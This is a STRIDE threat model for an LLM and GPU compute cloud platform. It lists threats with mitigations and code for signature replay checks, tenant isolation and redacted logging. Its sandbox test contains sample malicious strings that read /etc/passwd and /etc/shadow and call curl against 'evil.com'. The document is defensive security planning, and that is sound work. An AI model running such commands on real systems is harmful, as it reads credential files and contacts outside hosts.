# Animica Compute + LLM Cloud Platform - Threat Model

**Version:** 1.0  
**Date:** 2026-01-05  
**Status:** Living Document

## Executive Summary

This document identifies security threats to the Animica Compute + LLM Cloud Platform and describes mitigations for each threat. The threat model uses the STRIDE framework (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege) to systematically analyze security risks.

## System Overview

The platform consists of:
1. **Web Applications**: Public-facing UIs for chat, coding, dashboards
2. **API Gateway**: Entry point for all API requests
3. **Backend Services**: Auth, billing, inference, sandbox, queue
4. **Blockchain Integration**: Payment settlement and proof verification
5. **GPU Contributor Nodes**: Decentralized compute providers
6. **Data Stores**: PostgreSQL, Redis, S3/MinIO

## Trust Boundaries

```
┌─────────────────────────────────────────────────────────────┐
│                    Internet (Untrusted)                      │
└───────────────────────────┬─────────────────────────────────┘
                            │ TLS 1.3
┌───────────────────────────▼─────────────────────────────────┐
│                 Public API Gateway (DMZ)                     │
│  - Rate limiting                                             │
│  - WAF protection                                            │
│  - Auth token validation                                     │
└───────────────────────────┬─────────────────────────────────┘
                            │ mTLS
┌───────────────────────────▼─────────────────────────────────┐
│            Internal Services (Private Network)               │
│  - Auth, Billing, Inference, Sandbox, Queue                 │
│  - PostgreSQL, Redis                                         │
└───────────────────────────┬─────────────────────────────────┘
                            │ Off-chain bridge
┌───────────────────────────▼─────────────────────────────────┐
│             Animica Blockchain (Decentralized)               │
└─────────────────────────────────────────────────────────────┘
```

## Threat Categories

### 1. Authentication & Authorization (Spoofing, Elevation of Privilege)

#### Threat 1.1: Wallet Signature Replay Attack
**Description**: Attacker captures a wallet signature and replays it to impersonate a user.

**Impact**: HIGH - Unauthorized access to user account and resources.

**Mitigations**:
- Include timestamp in signature message (nonce)
- Reject signatures older than 5 minutes
- Include request-specific data (e.g., endpoint, action) in signature
- Store used nonces in Redis with TTL to prevent replay
- Use Dilithium3 (PQ-secure) signatures

**Implementation**:
```python
# Auth service verification
def verify_wallet_signature(address: str, signature: bytes, message: str, timestamp: int):
    # Check timestamp freshness
    if time.time() - timestamp > 300:  # 5 minutes
        raise SignatureExpiredError()
    
    # Check nonce hasn't been used
    nonce_key = f"nonce:{address}:{timestamp}"
    if redis.exists(nonce_key):
        raise NonceReusedError()
    
    # Verify PQ signature
    if not dilithium3_verify(address, signature, message):
        raise InvalidSignatureError()
    
    # Mark nonce as used
    redis.setex(nonce_key, 600, "1")
```

#### Threat 1.2: JWT Token Theft
**Description**: Attacker steals JWT token via XSS or network sniffing.

**Impact**: MEDIUM - Temporary unauthorized access until token expires.

**Mitigations**:
- Short-lived tokens (15 minutes)
- Refresh tokens stored in httpOnly cookies
- TLS 1.3 for all communications
- Implement token binding to client IP (optional, breaks mobile)
- Content-Security-Policy headers to prevent XSS

#### Threat 1.3: API Key Leakage
**Description**: API key exposed in public repository or logs.

**Impact**: HIGH - Unauthorized API access, potential bill shock.

**Mitigations**:
- Hash API keys before storage (never store plaintext)
- Prefix keys with identifiable string (`anm_`) for secret scanning
- Rate limiting per key
- Anomaly detection (unusual usage patterns)
- Key rotation capability
- Separate read/write keys

#### Threat 1.4: Privilege Escalation via RBAC Bypass
**Description**: User manipulates request to access resources they don't have permission for.

**Impact**: HIGH - Access to other tenants' data or admin functions.

**Mitigations**:
- Validate permissions on every request (no caching)
- Use tenant_id in all database queries
- Never trust client-provided tenant_id
- Audit logs for all permission checks
- Principle of least privilege for all roles

### 2. API Security (Tampering, Denial of Service)

#### Threat 2.1: API Abuse / Resource Exhaustion
**Description**: Attacker floods API with requests to exhaust resources or generate large bills.

**Impact**: HIGH - Service unavailability, cost overruns.

**Mitigations**:
- Rate limiting: 100 req/min for free tier, 1000 req/min for paid
- Per-tenant quotas on compute resources
- Request size limits (max 10MB payload)
- Timeout enforcement (30s for most operations)
- Credit balance checks before expensive operations
- Circuit breakers to prevent cascading failures
- Auto-ban IPs with malicious patterns

#### Threat 2.2: Prompt Injection in LLM Requests
**Description**: Attacker crafts malicious prompts to manipulate LLM output or extract training data.

**Impact**: MEDIUM - Inappropriate content generation, potential data leakage.

**Mitigations**:
- Content filtering on inputs and outputs
- System prompt isolation (not user-modifiable)
- Rate limits on failed requests
- Monitoring for known attack patterns
- User reporting mechanism
- Model fine-tuning to resist injections

#### Threat 2.3: DDoS Attack
**Description**: Distributed attack overwhelms infrastructure.

**Impact**: HIGH - Service unavailability.

**Mitigations**:
- CloudFlare DDoS protection
- Geographic rate limiting
- Challenge-response for suspicious traffic (CAPTCHA)
- Auto-scaling with limits to prevent cost explosion
- Graceful degradation (serve cached content)

### 3. Code Execution Sandbox (Tampering, Elevation of Privilege, DOS)

#### Threat 3.1: Sandbox Escape
**Description**: Malicious code breaks out of sandbox to access host system.

**Impact**: CRITICAL - Full system compromise, data breach.

**Mitigations**:
- Use gVisor (user-space kernel) or Firecracker (microVM)
- Regular security audits of sandbox infrastructure
- Fuzzing of sandbox with malicious payloads
- Principle of least privilege for sandbox runtime
- Read-only filesystem except /tmp
- No network access by default
- Resource limits (CPU, memory, PIDs)
- Seccomp filters to block dangerous syscalls

**Testing**:
```python
# Test sandbox escape attempts
def test_sandbox_escape_attempts():
    malicious_code = [
        "import os; os.system('cat /etc/passwd')",
        "import subprocess; subprocess.run(['curl', 'evil.com'])",
        "open('/etc/shadow', 'r').read()",
    ]
    for code in malicious_code:
        result = execute_in_sandbox(code)
        assert "error" in result or result["stdout"] == ""
```

#### Threat 3.2: Resource Exhaustion (Fork Bomb)
**Description**: Code creates unlimited processes or consumes all memory.

**Impact**: HIGH - Sandbox host unavailability.

**Mitigations**:
- PID limit (max 100 processes per sandbox)
- Memory limit (512MB default, 2GB max)
- CPU quota (100% of single core)
- Disk I/O limits
- Execution timeout (30s default, 300s max)
- Monitor and kill runaway processes

#### Threat 3.3: Data Exfiltration via Side Channels
**Description**: Malicious code uses timing, CPU cache, or other side channels to leak data.

**Impact**: MEDIUM - Potential cross-tenant information disclosure.

**Mitigations**:
- Dedicated sandboxes per request (no reuse)
- Randomized execution order
- Noise injection in timing measurements
- Monitoring for suspicious patterns

### 4. Billing & Payment (Tampering, Repudiation)

#### Threat 4.1: Payment Bypass
**Description**: Attacker manipulates requests to use resources without payment.

**Impact**: HIGH - Revenue loss.

**Mitigations**:
- Server-side credit checks (never trust client)
- Pessimistic locking on credit ledger
- Pre-authorization before expensive operations
- Real-time usage tracking
- Reconciliation jobs to detect discrepancies
- Audit logs for all transactions

#### Threat 4.2: Double Spending (ANM Tokens)
**Description**: Attacker attempts to use same payment intent multiple times.

**Impact**: HIGH - Revenue loss, marketplace integrity.

**Mitigations**:
- Payment intents have unique nonces
- On-chain verification before service delivery
- Idempotency keys for all payment operations
- Settlement only after blockchain confirmation
- Grace period for payment reversals

#### Threat 4.3: Billing Manipulation
**Description**: Attacker manipulates usage records to reduce bills.

**Impact**: MEDIUM - Revenue loss.

**Mitigations**:
- Immutable usage logs (append-only)
- Cryptographic signatures on usage records
- Regular audits comparing logs to actual resource usage
- Tamper-evident data structures
- Separate service for usage recording (not user-accessible)

### 5. Data Security (Information Disclosure)

#### Threat 5.1: Multi-Tenancy Data Leakage
**Description**: Tenant A accesses Tenant B's data due to insufficient isolation.

**Impact**: CRITICAL - Data breach, regulatory violations.

**Mitigations**:
- Tenant ID in all database queries (row-level security)
- Never use client-provided tenant ID directly
- Separate encryption keys per tenant
- Regular penetration testing
- Audit logs for all data access
- Automated tests for cross-tenant access

**Implementation**:
```python
# PostgreSQL Row-Level Security
CREATE POLICY tenant_isolation ON conversations
    USING (tenant_id = current_setting('app.current_tenant_id')::uuid);

# Application-level check
def get_conversation(conversation_id: UUID, user: User):
    query = select(Conversation).where(
        Conversation.id == conversation_id,
        Conversation.tenant_id == user.tenant_id  # Always include tenant check
    )
    return db.execute(query).scalar_one_or_none()
```

#### Threat 5.2: Sensitive Data in Logs
**Description**: Passwords, API keys, or PII logged in plaintext.

**Impact**: HIGH - Data breach, compliance violations.

**Mitigations**:
- Never log passwords, tokens, or API keys
- Redact sensitive fields (email→e***@***.com)
- Structured logging with explicit field marking
- Log aggregation with access controls
- Regular log audits

**Implementation**:
```python
# Safe logging
logger.info(
    "User login",
    extra={
        "user_id": user.id,
        "email": redact_email(user.email),
        "ip_address": anonymize_ip(request.client.host)
    }
)
```

#### Threat 5.3: Model Theft
**Description**: Attacker extracts trained model weights.

**Impact**: HIGH - IP theft, competitive disadvantage.

**Mitigations**:
- Models stored in private S3 with restrictive IAM policies
- No direct download endpoints
- Inference-only API access
- Rate limiting on inference to prevent model distillation
- Watermarking for model outputs (future)

### 6. Supply Chain (Tampering)

#### Threat 6.1: Compromised Dependencies
**Description**: Malicious code in npm/pip packages.

**Impact**: CRITICAL - Full system compromise.

**Mitigations**:
- Dependency pinning (lock files)
- Automated vulnerability scanning (Trivy, Snyk)
- Private package mirrors
- Code review for dependency updates
- Minimal dependencies (audit regularly)
- Subresource Integrity (SRI) for CDN resources

#### Threat 6.2: Compromised Container Images
**Description**: Backdoored base images or layers.

**Impact**: CRITICAL - Persistent compromise.

**Mitigations**:
- Official base images only (python:3.11-slim, node:20-alpine)
- Image signing with Cosign
- Vulnerability scanning in CI (Trivy)
- Minimal base images (distroless when possible)
- Multi-stage builds (separate build and runtime)

### 7. Blockchain Integration (Repudiation, Tampering)

#### Threat 7.1: Smart Contract Vulnerabilities
**Description**: Bugs in marketplace contracts lead to fund loss.

**Impact**: CRITICAL - Financial loss, loss of trust.

**Mitigations**:
- Formal verification of critical contracts
- Multiple independent audits
- Bug bounty program
- Gradual rollout with circuit breakers
- Upgrade mechanisms for emergency fixes
- Insurance fund for user protection

#### Threat 7.2: Oracle Manipulation
**Description**: Attacker manipulates off-chain data fed to smart contracts.

**Impact**: HIGH - Incorrect payments, marketplace disruption.

**Mitigations**:
- Multiple independent oracles
- Median/consensus-based aggregation
- Cryptographic proofs from off-chain services
- Time-weighted average prices (TWAP)
- Circuit breakers for anomalous data

#### Threat 7.3: Front-Running
**Description**: Attacker observes pending marketplace transactions and submits their own with higher gas.

**Impact**: MEDIUM - Unfair advantage, user frustration.

**Mitigations**:
- Commit-reveal schemes for bids
- Batch auctions instead of continuous trading
- Private mempool (future)
- Submarine sends via smart contracts

### 8. Insider Threats (Tampering, Information Disclosure)

#### Threat 8.1: Malicious Employee
**Description**: Employee with access abuses privileges.

**Impact**: CRITICAL - Data breach, sabotage.

**Mitigations**:
- Principle of least privilege
- All privileged actions logged and audited
- Multi-person approval for critical operations
- Background checks for employees
- Regular access reviews
- Separate production and development access

#### Threat 8.2: Compromised Admin Credentials
**Description**: Attacker steals admin credentials.

**Impact**: CRITICAL - Full system access.

**Mitigations**:
- MFA required for all admin access
- Short-lived credentials with auto-rotation
- Separate VPN for production access
- IP allowlisting for admin endpoints
- Session monitoring and anomaly detection
- Just-in-time access (JIT) for admin actions

### 9. Physical Security (Tampering, Denial of Service)

#### Threat 9.1: Data Center Breach
**Description**: Physical access to servers.

**Impact**: CRITICAL - Data theft, hardware tampering.

**Mitigations**:
- Use reputable cloud providers (AWS, GCP, Azure)
- Full disk encryption
- Regular security audits of provider
- Multi-region deployment for resilience
- Backup stored in separate geographic region

## Security Controls Summary

| Control | Purpose | Implementation |
|---------|---------|----------------|
| **TLS 1.3** | Encryption in transit | All external traffic |
| **mTLS** | Service authentication | Internal traffic |
| **JWT** | Stateless auth | 15min expiry, refresh tokens |
| **API Keys** | Programmatic access | Hashed storage, rate limited |
| **RBAC** | Authorization | Per-resource permissions |
| **Rate Limiting** | DoS prevention | Redis-backed, per-tenant |
| **Sandbox Isolation** | Code execution safety | gVisor/Firecracker |
| **Audit Logs** | Forensics | All mutations logged |
| **Encryption at Rest** | Data protection | AES-256 for DB, S3 |
| **Vulnerability Scanning** | Supply chain | Trivy in CI pipeline |
| **PQ Signatures** | Quantum resistance | Dilithium3 for wallets |
| **Circuit Breakers** | Resilience | Prevent cascading failures |

## Incident Response Plan

### Detection
- Automated alerts for security events (Sentry, PagerDuty)
- SIEM for log analysis
- Anomaly detection on API usage

### Response
1. **Identify**: Determine scope and impact
2. **Contain**: Isolate affected systems
3. **Eradicate**: Remove malicious code/access
4. **Recover**: Restore from clean backups
5. **Lessons Learned**: Post-mortem and improvements

### Communication
- Internal escalation path defined
- User notification within 72 hours (GDPR)
- Public disclosure for critical vulnerabilities

## Compliance Requirements

### GDPR
- Right to deletion: Automated user data purge
- Right to export: API endpoint for data download
- Consent management: Opt-in for analytics

### SOC 2
- Annual audit by independent firm
- Evidence collection automated
- Controls mapped to trust principles

### PCI-DSS (Future)
- If storing credit cards directly
- Tokenization via Stripe recommended

## Security Roadmap

### Q1 2026
- [ ] Complete threat model review
- [ ] Implement all critical mitigations
- [ ] First security audit
- [ ] Bug bounty program launch

### Q2 2026
- [ ] Penetration testing
- [ ] Incident response drills
- [ ] SOC 2 Type II audit
- [ ] Enhanced monitoring

### Q3 2026
- [ ] Zero-trust network implementation
- [ ] Hardware security modules (HSM) for keys
- [ ] Formal verification of smart contracts
- [ ] Chaos engineering for resilience

### Q4 2026
- [ ] Security certification (ISO 27001)
- [ ] Advanced threat detection (ML-based)
- [ ] Decentralized identity integration
- [ ] Privacy-enhancing technologies (PETs)

## References

1. OWASP Top 10: https://owasp.org/www-project-top-ten/
2. NIST Cybersecurity Framework: https://www.nist.gov/cyberframework
3. CIS Controls: https://www.cisecurity.org/controls
4. STRIDE Threat Modeling: https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool-threats

## Document Control

- **Owner**: Security Team
- **Review Frequency**: Quarterly
- **Last Reviewed**: 2026-01-05
- **Next Review**: 2026-04-05
